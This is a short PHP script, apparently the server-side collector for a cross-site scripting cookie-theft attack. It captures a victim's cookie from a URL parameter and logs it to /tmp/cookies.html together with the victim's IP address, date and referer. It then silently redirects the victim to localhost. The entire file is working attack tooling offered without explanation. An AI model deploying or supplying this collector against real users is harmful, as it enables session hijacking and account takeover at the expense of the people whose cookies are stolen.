<?php
$cookie = $_GET['c'];
$ip = getenv ('REMOTE_ADDR');
$date = date("j F, Y, g:i a");
$referer = getenv ('HTTP_Referer');
$out = 'Cookie: ' . $cookie . "\n";
$out = $out . 'IP: ' . $ip . "\n";
$out = $out . 'Date: ' . $date . "\n";
$out = $out . 'Referer: ' . $referer  . "\n\n";
$fp = fopen('/tmp/cookies.html', 'a');
fwrite($fp, $out);
fclose($fp);
header ("Location: http://127.0.0.1");
?>
<HTML></HTML>